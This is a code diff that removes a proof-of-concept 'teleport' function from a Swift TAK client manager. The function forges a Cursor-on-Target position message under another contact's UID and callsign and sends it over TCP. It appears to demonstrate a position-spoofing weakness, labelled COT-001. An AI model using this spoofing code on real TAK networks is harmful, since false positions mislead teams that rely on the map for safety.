@@ -205,28 +205,4 @@ class TAKManager: NSObject, URLSessionDelegate, ObservableObject {
         sendToTCP(message: alert)
         TAKLogger.debug("[TAKManager]: Done broadcasting emergency alert cancellation")
     }
-    
-    // MARK: - PoC: CoT Teleport (COT-001 demonstration)
-    
-    func teleportContact(targetUid: String, callsign: String, toLatitude lat: Double, toLongitude lon: Double) {
-        let now = Date()
-        let stale = now.addingTimeInterval(300)
-        let isoFormatter = ISO8601DateFormatter()
-        
-        let cotXml = """
-        <event version="2.0" uid="\(targetUid)" type="a-f-G-U-C" how="m-g" \
-        time="\(isoFormatter.string(from: now))" \
-        start="\(isoFormatter.string(from: now))" \
-        stale="\(isoFormatter.string(from: stale))">
-          <point lat="\(lat)" lon="\(lon)" hae="0" ce="9999999" le="9999999"/>
-          <detail>
-            <contact callsign="\(callsign)"/>
-            <__group name="\(SettingsStore.global.team)" role="\(SettingsStore.global.role)"/>
-          </detail>
-        </event>
-        """
-        
-        TAKLogger.debug("[TAKManager]: PoC TELEPORT — sending spoofed CoT for \(callsign) (\(targetUid)) to [\(lat), \(lon)]")
-        sendToTCP(message: cotXml)
-    }
 }
